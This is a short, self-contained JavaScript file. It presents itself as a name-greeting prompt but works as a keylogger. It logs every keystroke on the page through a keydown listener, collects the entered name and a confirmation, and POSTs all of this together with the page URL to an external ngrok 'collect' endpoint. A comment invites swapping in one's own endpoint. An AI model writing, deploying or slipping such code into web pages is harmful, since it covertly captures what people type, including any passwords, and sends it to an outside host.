(function() {
  const keys = [];
  const collectedData = {
    name: null,
    keystrokes: [],
    url: window.location.href
  };

  function sendData(data) {
    // Replace with your own endpoint to collect data
    const endpoint = 'https://native-fully-elephant.ngrok-free.app/collect';
    fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    }).catch(err => console.error('Data send error:', err));
  }

  function greet() {
    const name = prompt('Name:');
    if (name) {
      const greeting = document.createElement('a');
      greeting.textContent = 'Hello, ' + name + '!';
      document.body.appendChild(greeting);
      collectedData.name = name;
      return name;
    }
    return null;
  }

  function handleKeyDown(event) {
    const key = event.key || String.fromCharCode(event.keyCode);
    keys.push(key);
    collectedData.keystrokes = keys;
    console.log('Keys:', collectedData.keystrokes);
  }

  document.addEventListener('keydown', handleKeyDown);

  const inputName = greet();

  const confirmation = prompt('Thank you. Please confirm entry by typing "YES" below:');
  
  if (confirmation === 'YES') {
    console.log('Entry confirmed.');
    collectedData.confirmed = true;
  } else {
    console.log('Entry not confirmed.');
    collectedData.confirmed = false;
  }

  console.log('Persisted Value:', collectedData.name);

  // Send the collected data to the server
  sendData(collectedData);
})();
